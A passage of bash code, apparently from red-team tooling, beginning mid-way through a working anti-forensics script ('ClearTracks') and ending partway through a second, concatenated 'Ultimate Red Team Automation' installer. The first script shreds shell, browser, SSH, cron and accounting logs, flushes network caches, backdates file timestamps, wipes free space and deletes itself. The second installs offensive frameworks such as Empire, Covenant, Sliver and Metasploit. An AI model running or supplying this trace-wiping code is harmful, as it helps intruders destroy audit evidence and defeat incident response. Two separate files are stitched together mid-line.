        secure_delete "$user_home/.mozilla/firefox/*/formhistory.sqlite"
        secure_delete "$user_home/.mozilla/firefox/*/Cache2"
        
        # Chrome/Chromium
        secure_delete "$user_home/.config/google-chrome/Default/History"
        secure_delete "$user_home/.config/google-chrome/Default/Cookies"
        secure_delete "$user_home/.config/google-chrome/Default/Cache"
        secure_delete "$user_home/.config/chromium/Default/History"
        secure_delete "$user_home/.config/chromium/Default/Cookies"
        
        # Recently used files
        secure_delete "$user_home/.local/share/recently-used.xbel"
        secure_delete "$user_home/.recently-used"
    done
    
    # VIM history
    find /home -name '.viminfo' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /root -name '.viminfo' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    # MySQL history
    find /home -name '.mysql_history' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /root -name '.mysql_history' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    # Python history
    find /home -name '.python_history' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /root -name '.python_history' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    # SQLite history
    find /home -name '.sqlite_history' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    log "${GREEN}[+] Application traces cleared${NC}"
}

function clear_network_traces() {
    log "${BLUE}[*] Clearing network traces...${NC}"
    
    # SSH artifacts
    find /home -path '*/.ssh/known_hosts' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /home -path '*/.ssh/authorized_keys' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /home -path '*/.ssh/config' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    [[ -f "/root/.ssh/known_hosts" ]] && secure_delete "/root/.ssh/known_hosts"
    [[ -f "/root/.ssh/authorized_keys" ]] && secure_delete "/root/.ssh/authorized_keys"
    [[ -f "/root/.ssh/config" ]] && secure_delete "/root/.ssh/config"
    
    # Clear ARP cache
    ip -s -s neigh flush all 2>/dev/null
    
    # Clear connection tracking
    if command -v conntrack &> /dev/null; then
        conntrack -F 2>/dev/null
    fi
    
    # Clear DNS cache
    systemd-resolve --flush-caches 2>/dev/null || true
    
    # Network configuration history
    secure_delete "/var/lib/dhcp/dhclient.leases"
    secure_delete "/var/lib/NetworkManager"
    
    log "${GREEN}[+] Network traces cleared${NC}"
}

function clear_temporary_files() {
    log "${BLUE}[*] Clearing temporary files...${NC}"
    
    # System temp directories
    find /tmp -type f -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /var/tmp -type f -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /dev/shm -type f -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    # User temp files
    find /home -type f \( -name '*.tmp' -o -name '*.swp' -o -name '*.swpx' -o -name '*.swo' \) \
         -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    # Thumbnail cache
    find /home -type d -name '.thumbnails' -exec rm -rf {} \; 2>/dev/null
    find /home -type d -name 'thumbnails' -exec rm -rf {} \; 2>/dev/null
    
    # Trash
    find /home -type d -name '.local/share/Trash' -exec rm -rf {} \; 2>/dev/null
    
    log "${GREEN}[+] Temporary files cleared${NC}"
}

function clear_system_artifacts() {
    log "${BLUE}[*] Clearing system artifacts...${NC}"
    
    # Process accounting
    secure_delete "/var/account/pacct"
    secure_delete "/var/log/account"
    
    # Cron logs
    secure_delete "/var/log/cron"
    secure_delete "/var/log/cron.log"
    
    # Mail logs
    secure_delete "/var/log/mail.log"
    secure_delete "/var/log/mail.err"
    
    # System state
    secure_delete "/var/lib/systemd/random-seed"
    secure_delete "/var/lib/urandom/random-seed"
    
    # Core dumps
    find /var/crash -type f -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    find /home -name 'core.*' -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    # Locate databases
    secure_delete "/var/lib/mlocate/mlocate.db"
    secure_delete "/var/lib/locate/locatedb"
    
    log "${GREEN}[+] System artifacts cleared${NC}"
}

function clear_metadata() {
    log "${BLUE}[*] Clearing file metadata...${NC}"
    
    # Extended attributes
    find /home -type f -exec setfattr --remove-all {} \; 2>/dev/null
    
    # File access times (if possible without damaging system)
    if $PARANOID; then
        find /home -type f -exec touch -t 202001010000.00 {} \; 2>/dev/null
        find /home -type d -exec touch -t 202001010000.00 {} \; 2>/dev/null
    fi
    
    log "${GREEN}[+] Metadata cleared${NC}"
}

function clear_memory() {
    log "${BLUE}[*] Clearing memory artifacts...${NC}"
    
    # Clear swap
    swapoff -a 2>/dev/null && swapon -a 2>/dev/null
    
    # Drop caches
    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
    echo 2 > /proc/sys/vm/drop_caches 2>/dev/null
    echo 1 > /proc/sys/vm/compact_memory 2>/dev/null
    
    # Clear shared memory
    find /dev/shm -type f -exec shred -u -n $SHRED_ITERATIONS {} \; 2>/dev/null
    
    log "${GREEN}[+] Memory artifacts cleared${NC}"
}

function overwrite_free_space() {
    if $PARANOID; then
        log "${YELLOW}[!] Paranoid mode: Overwriting free disk space (this may take a while)${NC}"
        
        # Create zero files to overwrite free space
        for mount_point in $(df | grep '^/dev/' | awk '{print $6}'); do
            log "${BLUE}[*] Overwriting free space on $mount_point${NC}"
            dd if=/dev/zero of="$mount_point/zerofile_$" bs=1M 2>/dev/null || true
            sync
            rm -f "$mount_point/zerofile_$" 2>/dev/null
        done
        
        log "${GREEN}[+] Free space overwrite complete${NC}"
    fi
}

function selective_cleanup() {
    echo -e "${CYAN}Select cleanup operations:${NC}"
    echo "1. Bash/Shell History"
    echo "2. System Logs"
    echo "3. Application Traces"
    echo "4. Network Traces"
    echo "5. Temporary Files"
    echo "6. System Artifacts"
    echo "7. File Metadata"
    echo "8. Memory/Swap"
    echo "9. All of the above"
    echo "0. Exit"
    
    read -p "Enter choices (comma-separated, e.g., 1,2,3): " choices
    
    IFS=',' read -ra ADDR <<< "$choices"
    for choice in "${ADDR[@]}"; do
        case $choice in
            1) clear_bash_history;;
            2) clear_system_logs;;
            3) clear_application_traces;;
            4) clear_network_traces;;
            5) clear_temporary_files;;
            6) clear_system_artifacts;;
            7) clear_metadata;;
            8) clear_memory;;
            9) run_full_cleanup;;
            0) exit 0;;
            *) log "${RED}[!] Invalid choice: $choice${NC}";;
        esac
    done
}

function run_full_cleanup() {
    clear_bash_history
    clear_system_logs
    clear_application_traces
    clear_network_traces
    clear_temporary_files
    clear_system_artifacts
    clear_metadata
    clear_memory
    overwrite_free_space
}

function main() {
    show_banner
    confirm_operation
    
    log "${YELLOW}[*] Starting ClearTracks v2.1${NC}"
    log "${YELLOW}[*] Mode: Paranoid=$PARANOID, Stealth=$STEALTH, Selective=$SELECTIVE${NC}"
    log "${YELLOW}[*] Shred iterations: $SHRED_ITERATIONS${NC}"
    
    if $SELECTIVE; then
        selective_cleanup
    else
        run_full_cleanup
    fi
    
    # Final sync
    sync
    
    log "${GREEN}[+] ClearTracks operation complete${NC}"
    log "${GREEN}[+] System traces have been cleared${NC}"
    
    if $STEALTH; then
        # Self-destruct in stealth mode
        log "${YELLOW}[*] Self-destructing in stealth mode${NC}"
        shred -u -n $SHRED_ITERATIONS "$0" 2>/dev/null
    fi
}

# Signal handlers
trap 'log "${RED}[!] Operation interrupted${NC}"; exit 1' INT TERM

# Run main function
main "$@"
EOF
    
    chmod +x "$cleartracks_script"
    log "SUCCESS" "ClearTracks Anti-Forensics tool installed at $cleartracks_script"
}

# ============================================================================
#                         UTILITY TOOLS MENU
# ============================================================================

show_utility_tools_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                            UTILITY TOOLS                                    ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}Install DNS Changer Eye${NC}"
        echo -e "2.  ${BLUE}Run DNS Changer Eye${NC}"
        echo -e "3.  ${BLUE}Install ClearTracks Anti-Forensics${NC}"
        echo -e "4.  ${BLUE}Run ClearTracks (Standard)${NC}"
        echo -e "5.  ${BLUE}Run ClearTracks (Paranoid Mode)${NC}"
        echo -e "6.  ${BLUE}Run ClearTracks (Selective Mode)${NC}"
        echo -e "7.  ${BLUE}System Hardening Tools${NC}"
        echo -e "8.  ${BLUE}Network Tools${NC}"
        echo -e "9.  ${BLUE}Forensics Tools${NC}"
        echo -e "10. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-10]: ${NC}"
        read utility_choice
        
        case $utility_choice in
            1) 
                install_dns_changer
                read -p "Press Enter to continue..."
                ;;
            2) 
                if [[ -f "$TOOLS_DIR/dns_changer_eye.py" ]]; then
                    python3 "$TOOLS_DIR/dns_changer_eye.py"
                else
                    log "ERROR" "DNS Changer Eye not installed. Install it first."
                fi
                read -p "Press Enter to continue..."
                ;;
            3) 
                install_cleartracks
                read -p "Press Enter to continue..."
                ;;
            4) 
                if [[ -f "$TOOLS_DIR/cleartracks.sh" ]]; then
                    echo -e "${RED}WARNING: This will clear system logs and traces!${NC}"
                    read -p "Continue? (y/N): " confirm
                    if [[ "$confirm" =~ [yY] ]]; then
                        sudo "$TOOLS_DIR/cleartracks.sh"
                    fi
                else
                    log "ERROR" "ClearTracks not installed. Install it first."
                fi
                read -p "Press Enter to continue..."
                ;;
            5) 
                if [[ -f "$TOOLS_DIR/cleartracks.sh" ]]; then
                    echo -e "${RED}WARNING: Paranoid mode will overwrite free disk space!${NC}"
                    read -p "Continue? (y/N): " confirm
                    if [[ "$confirm" =~ [yY] ]]; then
                        sudo "$TOOLS_DIR/cleartracks.sh" --paranoid
                    fi
                else
                    log "ERROR" "ClearTracks not installed. Install it first."
                fi
                read -p "Press Enter to continue..."
                ;;
            6) 
                if [[ -f "$TOOLS_DIR/cleartracks.sh" ]]; then
                    sudo "$TOOLS_DIR/cleartracks.sh" --selective
                else
                    log "ERROR" "ClearTracks not installed. Install it first."
                fi
                read -p "Press Enter to continue..."
                ;;
            7) 
                show_hardening_tools
                ;;
            8) 
                show_network_tools
                ;;
            9) 
                show_forensics_tools
                ;;
            10) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 10."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_hardening_tools() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                          SYSTEM HARDENING TOOLS                             ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    cat << 'EOF'

1. FIREWALL CONFIGURATION:
   # Enable UFW firewall
   sudo ufw enable
   sudo ufw default deny incoming
   sudo ufw default allow outgoing
   
   # Allow specific services
   sudo ufw allow ssh
   sudo ufw allow 80/tcp
   sudo ufw allow 443/tcp

2. SSH HARDENING:
   # Disable root login
   sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
   
   # Change default port
   sudo sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
   
   # Disable password authentication
   sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

3. SYSTEM UPDATES:
   # Update system packages
   sudo apt update && sudo apt upgrade -y
   sudo apt autoremove -y

4. KERNEL PARAMETERS:
   # Enable ASLR
   echo 'kernel.randomize_va_space = 2' | sudo tee -a /etc/sysctl.conf
   
   # Disable IP forwarding
   echo 'net.ipv4.ip_forward = 0' | sudo tee -a /etc/sysctl.conf

5. LOG MONITORING:
   # Install fail2ban
   sudo apt install fail2ban -y
   sudo systemctl enable fail2ban
   sudo systemctl start fail2ban

6. FILE PERMISSIONS:
   # Secure important files
   sudo chmod 600 /etc/shadow
   sudo chmod 644 /etc/passwd
   sudo chmod 600 /boot/grub/grub.cfg

EOF
    
    echo -e "${BLUE}Select hardening option:${NC}"
    echo "1. Quick system hardening"
    echo "2. SSH hardening"
    echo "3. Firewall setup"
    echo "4. Install security tools"
    echo "5. Back to utilities menu"
    
    read -p "Choice: " harden_choice
    
    case $harden_choice in
        1) 
            log "INFO" "Applying quick system hardening..."
            sudo ufw --force enable
            sudo ufw default deny incoming
            sudo apt update && sudo apt install -y fail2ban
            sudo systemctl enable fail2ban
            log "SUCCESS" "Basic hardening applied"
            ;;
        2) 
            log "INFO" "Applying SSH hardening..."
            sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
            sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
            sudo sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
            sudo systemctl restart ssh
            log "SUCCESS" "SSH hardening applied"
            ;;
        3) 
            log "INFO" "Configuring firewall..."
            sudo ufw --force enable
            sudo ufw default deny incoming
            sudo ufw default allow outgoing
            sudo ufw allow ssh
            log "SUCCESS" "Firewall configured"
            ;;
        4) 
            log "INFO" "Installing security tools..."
            sudo apt install -y rkhunter chkrootkit lynis clamav
            log "SUCCESS" "Security tools installed"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

show_network_tools() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                             NETWORK TOOLS                                   ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${BLUE}Select network tool:${NC}"
    echo "1. Network discovery (nmap)"
    echo "2. Port scanning"
    echo "3. Network monitoring"
    echo "4. Traffic analysis"
    echo "5. DNS tools"
    echo "6. Back to utilities menu"
    
    read -p "Choice: " net_choice
    
    case $net_choice in
        1) 
            read -p "Enter target IP/range: " target
            nmap -sn "$target"
            ;;
        2) 
            read -p "Enter target IP: " target
            nmap -sS -O "$target"
            ;;
        3) 
            log "INFO" "Starting network monitoring..."
            sudo netstat -tuln
            ss -tuln
            ;;
        4) 
            if command -v tcpdump &> /dev/null; then
                read -p "Enter interface (or press Enter for any): " interface
                if [[ -n "$interface" ]]; then
                    sudo tcpdump -i "$interface"
                else
                    sudo tcpdump
                fi
            else
                log "ERROR" "tcpdump not installed"
            fi
            ;;
        5) 
            read -p "Enter domain to lookup: " domain
            dig "$domain"
            nslookup "$domain"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

show_forensics_tools() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                           FORENSICS TOOLS                                   ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${BLUE}Select forensics tool:${NC}"
    echo "1. File recovery (testdisk/photorec)"
    echo "2. Memory dump analysis"
    echo "3. Log analysis"
    echo "4. Hash verification"
    echo "5. Timeline analysis"
    echo "6. Install forensics suite"
    echo "7. Back to utilities menu"
    
    read -p "Choice: " forensics_choice
    
    case $forensics_choice in
        1) 
            if command -v photorec &> /dev/null; then
                sudo photorec
            else
                log "ERROR" "PhotoRec not installed. Install with: sudo apt install testdisk"
            fi
            ;;
        2) 
            log "INFO" "Memory analysis tools:"
            echo "- Volatility Framework"
            echo "- rekall"
            echo "- LiME (Linux Memory Extractor)"
            ;;
        3) 
            echo "Recent authentication attempts:"
            sudo grep "Failed password" /var/log/auth.log | tail -10
            echo -e "\nRecent successful logins:"
            sudo grep "Accepted password" /var/log/auth.log | tail -10
            ;;
        4) 
            read -p "Enter file path to verify: " filepath
            if [[ -f "$filepath" ]]; then
                echo "MD5: $(md5sum "$filepath")"
                echo "SHA1: $(sha1sum "$filepath")"
                echo "SHA256: $(sha256sum "$filepath")"
            else
                log "ERROR" "File not found"
            fi
            ;;
        5) 
            echo "System timeline (recent file modifications):"
            find /home -type f -mtime -1 -ls 2>/dev/null | head -20
            ;;
        6) 
            log "INFO" "Installing forensics suite..."
            detect_os
            case $OS_NAME in
                "ubuntu"|"debian"|"redhunt")
                    sudo apt install -y testdisk photorec sleuthkit autopsy volatility-tools
                    ;;
                "fedora"|"centos"|"rhel")
                    sudo dnf install -y testdisk photorec sleuthkit autopsy
                    ;;
                *)
                    log "WARNING" "Manual installation required for $OS_NAME"
                    ;;
            esac
            log "SUCCESS" "Forensics tools installed"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}#!/usr/bin/env bash

# ============================================================================
#                   ULTIMATE RED TEAM AUTOMATION SCRIPT v3.0
# ============================================================================
# Enhanced with comprehensive features, proper error handling, and all tools
# Integrates MITRE Caldera, Atomic Red Team, Purple Team Tools, and more
# Author: Enhanced Security Framework
# License: Educational Use Only
# ============================================================================

# Global Configuration
VERSION="3.0"
SCRIPT_NAME="Ultimate Red Team Automation"
CONFIG_FILE="$HOME/.redteam_config"
LOG_FILE="$HOME/redteam_automation.log"
TEMP_DIR="/tmp/redteam_$(date +%s)"
BACKUP_DIR="$HOME/.redteam_backups"
TOOLS_DIR="$HOME/redteam_tools"

# Color Schemes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Process tracking
CALDERA_PID=""
EMPIRE_PID=""
COVENANT_PID=""

# Create necessary directories
mkdir -p "$TEMP_DIR" "$BACKUP_DIR" "$TOOLS_DIR"

# ============================================================================
#                           LOGGING AND UTILITIES
# ============================================================================

log() {
    local level=$1
    local message=$2
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    
    echo -e "[$timestamp] [$level] $message" >> "$LOG_FILE"
    
    case $level in
        "ERROR")
            echo -e "${RED}[!] ERROR:${NC} $message"
            ;;
        "WARNING")
            echo -e "${YELLOW}[!] WARNING:${NC} $message"
            ;;
        "INFO")
            echo -e "${GREEN}[+] INFO:${NC} $message"
            ;;
        "SUCCESS")
            echo -e "${GREEN}[✓] SUCCESS:${NC} $message"
            ;;
        "DEBUG")
            if [[ "$DEBUG_MODE" == "true" ]]; then
                echo -e "${CYAN}[*] DEBUG:${NC} $message"
            fi
            ;;
        *)
            echo -e "${WHITE}[*]${NC} $message"
            ;;
    esac
}

banner() {
    clear
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════════════════════════════════════╗"
    echo "║                    ULTIMATE RED TEAM AUTOMATION v$VERSION                        ║"
    echo "║                         Enhanced Security Framework                          ║"
    echo "╠══════════════════════════════════════════════════════════════════════════════╣"
    echo "║  Comprehensive MITRE ATT&CK Framework Implementation                        ║"
    echo "║  Educational Use Only - Authorized Personnel Only                           ║"
    echo "╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -eq 0 ]]; then
        log "WARNING" "Running as root. Some operations may be restricted for security."
        read -p "Continue as root? (y/n): " root_choice
        if [[ ! "$root_choice" =~ [yY] ]]; then
            log "INFO" "Exiting for security reasons."
            exit 0
        fi
    fi
}

check_dependencies() {
    local missing=0
    local deps=("git" "python3" "pip3" "curl" "wget" "jq" "yq" "docker" "go" "node" "npm")
    
    log "INFO" "Checking system dependencies..."
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            log "WARNING" "Dependency $dep not found"
            missing=$((missing + 1))
        else
            log "DEBUG" "Found dependency: $dep"
        fi
    done
    
    if [[ "$missing" -gt 0 ]]; then
        log "WARNING" "$missing dependencies missing. Installing..."
        install_dependencies
    else
        log "SUCCESS" "All dependencies found"
    fi
}

detect_os() {
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        OS_NAME="$ID"
        OS_VERSION="$VERSION_ID"
        OS_PRETTY="$PRETTY_NAME"
    elif [[ -f /etc/redhat-release ]]; then
        OS_NAME="rhel"
        OS_PRETTY=$(cat /etc/redhat-release)
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS_NAME="macos"
        OS_PRETTY="macOS $(sw_vers -productVersion)"
    else
        OS_NAME="unknown"
        OS_PRETTY="Unknown OS"
    fi
    
    # Check if it's RedHunt OS
    if [[ "$OS_PRETTY" == *"RedHunt"* ]] || [[ -f /usr/share/redhunt-os/version ]]; then
        OS_NAME="redhunt"
        OS_PRETTY="RedHunt OS"
        log "INFO" "Detected RedHunt OS - Security-focused distribution"
    fi
    
    # Check for snap support
    if command -v snap &> /dev/null; then
        SNAP_AVAILABLE=true
        log "DEBUG" "Snap package manager available"
    else
        SNAP_AVAILABLE=false
    fi
    
    log "INFO" "Detected OS: $OS_PRETTY"
}

install_dependencies() {
    log "INFO" "Installing missing dependencies..."
    detect_os
    
    case $OS_NAME in
        "ubuntu"|"debian"|"redhunt")
            sudo apt update
            sudo apt install -y git python3 python3-pip curl wget jq docker.io golang nodejs npm \
                               build-essential cmake make gcc g++ libssl-dev pkg-config \
                               net-tools nmap masscan gobuster nikto dirb hashcat john \
                               metasploit-framework sqlmap wireshark tcpdump
            
            # Install yq for YAML processing
            sudo wget -qO /usr/local/bin/yq https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64
            sudo chmod +x /usr/local/bin/yq
            
            # Install snap packages if available
            if [[ "$SNAP_AVAILABLE" == "true" ]]; then
                sudo snap install code --classic 2>/dev/null || true
                sudo snap install discord 2>/dev/null || true
                sudo snap install postman 2>/dev/null || true
            fi
            
            # RedHunt OS specific tools
            if [[ "$OS_NAME" == "redhunt" ]]; then
                log "INFO" "Installing RedHunt OS specific security tools..."
                sudo apt install -y zaproxy burpsuite maltego recon-ng theharvester \
                                   aircrack-ng kismet wifite social-engineer-toolkit \
                                   beef-xss armitage backdoor-factory veil-framework
            fi
            ;;
        "fedora"|"centos"|"rhel")
            sudo dnf install -y git python3 python3-pip curl wget jq docker golang nodejs npm \
                               gcc gcc-c++ make cmake openssl-devel pkg-config \
                               nmap masscan nikto hashcat john
            sudo wget -qO /usr/local/bin/yq https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64
            sudo chmod +x /usr/local/bin/yq
            ;;
        "arch")
            sudo pacman -S --noconfirm git python python-pip curl wget jq docker go nodejs npm \
                                      gcc make cmake openssl pkg-config \
                                      nmap masscan nikto hashcat john
            sudo wget -qO /usr/local/bin/yq https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64
            sudo chmod +x /usr/local/bin/yq
            ;;
        "macos")
            if command -v brew &> /dev/null; then
                brew install git python3 curl wget jq yq docker golang node npm \
                           nmap masscan nikto hashcat john-jumbo
            else
                log "ERROR" "Homebrew not found. Please install Homebrew first."
                return 1
            fi
            ;;
        *)
            log "WARNING" "Unsupported OS: $OS_NAME. Please install dependencies manually."
            return 1
            ;;
    esac
    
    # Install Python security libraries
    pip3 install --user requests beautifulsoup4 lxml colorama termcolor pycryptodome \
                        scapy netaddr python-nmap dnspython pexpect paramiko \
                        impacket bloodhound py2neo neo4j-driver
}

init_config() {
    if [[ ! -f "$CONFIG_FILE" ]]; then
        log "INFO" "Creating configuration file at $CONFIG_FILE"
        cat > "$CONFIG_FILE" <<- EOM
# Ultimate Red Team Automation Configuration
VERSION="$VERSION"
TOOLS_DIR="$TOOLS_DIR"
CALDERA_DIR="$TOOLS_DIR/caldera"
ATOMIC_RED_TEAM_DIR="$TOOLS_DIR/atomic-red-team"
EMPIRE_DIR="$TOOLS_DIR/Empire"
COVENANT_DIR="$TOOLS_DIR/Covenant"
SLIVER_DIR="$TOOLS_DIR/sliver"
MYTHIC_DIR="$TOOLS_DIR/Mythic"
HAVOC_DIR="$TOOLS_DIR/Havoc"
MERLIN_DIR="$TOOLS_DIR/merlin"
METASPLOIT_DIR="/opt/metasploit-framework"
COBALT_STRIKE_DIR="$TOOLS_DIR/cobaltstrike"
DEBUG_MODE="false"
AUTO_UPDATE="true"
BACKUP_ENABLED="true"
EOM
    fi
    
    source "$CONFIG_FILE"
    log "SUCCESS" "Configuration loaded from $CONFIG_FILE"
}

# ============================================================================
#                           MITRE CALDERA OPERATIONS
# ============================================================================

install_caldera() {
    log "INFO" "Starting Caldera installation..."
    
    if [[ -d "$CALDERA_DIR" ]]; then
        log "INFO" "Caldera directory already exists at $CALDERA_DIR"
        read -p "Do you want to update Caldera? (y/n): " update_choice
        if [[ "$update_choice" =~ [yY] ]]; then
            update_caldera
            return $?
        else
            return 0
        fi
    fi
    
    log "INFO" "Cloning Caldera repository..."
    git clone https://github.com/mitre/caldera.git --recursive "$CALDERA_DIR"
    
    if [[ $? -ne 0 ]]; then
        log "ERROR" "Failed to clone Caldera repository"
        return 1
    fi
    
    cd "$CALDERA_DIR" || return 1
    
    # Install Python dependencies
    log "INFO" "Installing Python dependencies..."
    pip3 install -r requirements.txt
    
    if [[ $? -ne 0 ]]; then
        log "ERROR" "Failed to install Python dependencies"
        return 1
    fi
    
    # Install additional plugins
    install_caldera_plugins
    
    log "SUCCESS" "Caldera installation complete"
    cd - || return 1
    return 0
}

update_caldera() {
    log "INFO" "Updating Caldera..."
    cd "$CALDERA_DIR" || return 1
    
    # Backup current configuration
    if [[ "$BACKUP_ENABLED" == "true" ]]; then
        backup_dir="$BACKUP_DIR/caldera_$(date +%Y%m%d_%H%M%S)"
        mkdir -p "$backup_dir"
        cp -r conf/ "$backup_dir/" 2>/dev/null
        log "INFO" "Configuration backed up to $backup_dir"
    fi
    
    git pull --recurse-submodules
    pip3 install -r requirements.txt --upgrade
    
    log "SUCCESS" "Caldera updated successfully"
    cd - || return 1
    return 0
}

install_caldera_plugins() {
    log "INFO" "Installing Caldera plugins..."
    
    local plugins=(
        "https://github.com/mitre/stockpile.git"
        "https://github.com/mitre/sandcat.git"
        "https://github.com/mitre/manx.git"
        "https://github.com/mitre/response.git"
        "https://github.com/mitre/atomic.git"
        "https://github.com/mitre/training.git"
        "https://github.com/mitre/compass.git"
        "https://github.com/mitre/emu.git"
        "https://github.com/mitre/mock.git"
        "https://github.com/mitre/gameboard.git"
    )
    
    cd "$CALDERA_DIR/plugins" || return 1
    
    for plugin in "${plugins[@]}"; do
        local plugin_name=$(basename "$plugin" .git)
        if [[ ! -d "$plugin_name" ]]; then
            log "INFO" "Installing plugin: $plugin_name"
            git clone "$plugin"
            
            if [[ $? -eq 0 ]]; then
                # Install plugin dependencies if they exist
                if [[ -f "$plugin_name/requirements.txt" ]]; then
                    pip3 install -r "$plugin_name/requirements.txt"
                fi
                log "SUCCESS" "Plugin $plugin_name installed"
            else
                log "ERROR" "Failed to install plugin: $plugin_name"
            fi
        else
            log "DEBUG" "Plugin $plugin_name already exists"
        fi
    done
    
    cd - || return 1
    log "SUCCESS" "Plugin installation complete"
}

start_caldera() {
    log "INFO" "Starting Caldera server..."
    
    if [[ ! -d "$CALDERA_DIR" ]]; then
        log "ERROR" "Caldera not found. Please install Caldera first."
        return 1
    fi
    
    # Check if already running
    if pgrep -f "python.*server.py" > /dev/null; then
        log "WARNING" "Caldera server appears to be running"
        local existing_pid=$(pgrep -f "python.*server.py")
        log "INFO" "Existing process PID: $existing_pid"
        read -p "Kill existing process and start new one? (y/n): " kill_choice
        if [[ "$kill_choice" =~ [yY] ]]; then
            kill "$existing_pid"
            sleep 2
        else
            return 1
        fi
    fi
    
    cd "$CALDERA_DIR" || return 1
    
    # Configuration options
    local cmd="python3 server.py --insecure"
    
    echo -e "${CYAN}Caldera Configuration Options:${NC}"
    read -p "Enable debug mode? (y/n): " debug_choice
    if [[ "$debug_choice" =~ [yY] ]]; then
        cmd="$cmd --log DEBUG"
    fi
    
    read -p "Custom port (default 8888): " port_choice
    if [[ -n "$port_choice" ]]; then
        cmd="$cmd --port $port_choice"
    fi
    
    read -p "Enable plugin auto-update? (y/n): " update_choice
    if [[ "$update_choice" =~ [yY] ]]; then
        cmd="$cmd --build"
    fi
    
    log "INFO" "Starting Caldera with command: $cmd"
    $cmd &
    CALDERA_PID=$!
    
    sleep 3
    
    if kill -0 "$CALDERA_PID" 2>/dev/null; then
        log "SUCCESS" "Caldera server started with PID $CALDERA_PID"
        echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║           CALDERA SERVER INFO          ║${NC}"
        echo -e "${GREEN}╠════════════════════════════════════════╣${NC}"
        echo -e "${GREEN}║ PID:${NC} $CALDERA_PID"
        echo -e "${GREEN}║ URL:${NC} http://localhost:${port_choice:-8888}"
        echo -e "${GREEN}║ Default Login:${NC} red/admin"
        echo -e "${GREEN}║ Blue Team:${NC} blue/admin"
        echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
    else
        log "ERROR" "Failed to start Caldera server"
        return 1
    fi
    
    cd - || return 1
    return 0
}

stop_caldera() {
    log "INFO" "Stopping Caldera server..."
    
    if [[ -n "$CALDERA_PID" ]] && kill -0 "$CALDERA_PID" 2>/dev/null; then
        kill "$CALDERA_PID"
        wait "$CALDERA_PID" 2>/dev/null
        log "SUCCESS" "Caldera server stopped"
        unset CALDERA_PID
    else
        local running_pids=$(pgrep -f "python.*server.py")
        if [[ -n "$running_pids" ]]; then
            log "INFO" "Found running Caldera processes: $running_pids"
            read -p "Stop all Caldera processes? (y/n): " stop_choice
            if [[ "$stop_choice" =~ [yY] ]]; then
                echo "$running_pids" | xargs kill
                log "SUCCESS" "All Caldera processes stopped"
            fi
        else
            log "INFO" "No running Caldera processes found"
        fi
    fi
}

# ============================================================================
#                        ATOMIC RED TEAM OPERATIONS
# ============================================================================

install_atomic_red_team() {
    log "INFO" "Installing Atomic Red Team..."
    
    if [[ -d "$ATOMIC_RED_TEAM_DIR" ]]; then
